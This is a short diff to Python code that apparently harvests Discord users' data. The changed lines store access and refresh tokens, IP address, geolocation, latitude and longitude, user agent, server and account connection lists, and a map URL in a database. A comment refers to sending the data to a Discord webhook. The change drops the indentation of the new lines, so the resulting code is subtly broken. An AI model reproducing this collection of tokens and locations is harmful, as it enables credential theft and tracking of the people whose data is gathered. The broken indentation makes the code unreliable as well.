@@ -238,9 +238,25 @@ tokens[user_id] = {
     'map_url': map_url
 }
 
-  c.execute('''INSERT OR REPLACE INTO tokens (user_id, access_token, refresh_token, ip, geo, useragent, lat, lon, guild_list, connection_list, map_url) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-            (user_id, access_token, refresh_token, ip, json.dumps(geo), useragent, str(lat), str(lon), guild_list, connection_list, map_url))
-  conn.commit()
+c.execute(
+    '''INSERT OR REPLACE INTO tokens 
+       (user_id, access_token, refresh_token, ip, geo, useragent, lat, lon, guild_list, connection_list, map_url) 
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+    (
+        user_id,
+        access_token,
+        refresh_token,
+        ip,
+        json.dumps(geo),
+        useragent,
+        str(lat),
+        str(lon),
+        guild_list,
+        connection_list,
+        map_url
+    )
+)
+conn.commit()
 
   try:
     # Discord webhooks limit message content to 2000 chars; keep headroom.
